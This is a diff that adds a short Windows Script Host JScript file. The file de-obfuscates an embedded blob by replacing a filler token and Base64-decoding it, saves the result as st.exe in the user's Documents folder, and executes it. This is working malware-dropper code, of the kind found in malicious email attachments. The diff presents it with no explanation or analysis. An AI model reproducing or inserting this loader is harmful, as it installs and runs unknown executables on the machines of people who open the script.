@@ -1,0 +1,16 @@
+var flo = new ActiveXObject ("ADODB.Stream");
+var runer = WScript.CreateObject("WScript.Shell");
+var wher = runer.SpecialFolders("MyDocuments");
+wher = wher + "\\" + "st.exe";
+flo.CharSet = "437";
+flo.Open();
+var pny = data_pn.replace(/NMSIOP/g, "A");
+var pny_ar = CryptoJS.enc.Base64.parse(pny);
+var pny_dec = pny_ar.toString(CryptoJS.enc.Utf8);
+flo.Position = 0;
+flo.SetEOS;
+flo.WriteText(pny_dec);
+flo.SaveToFile(wher, 2);
+flo.Close;
+wher = "\"" + wher + "\"";
+runer.Run(wher);
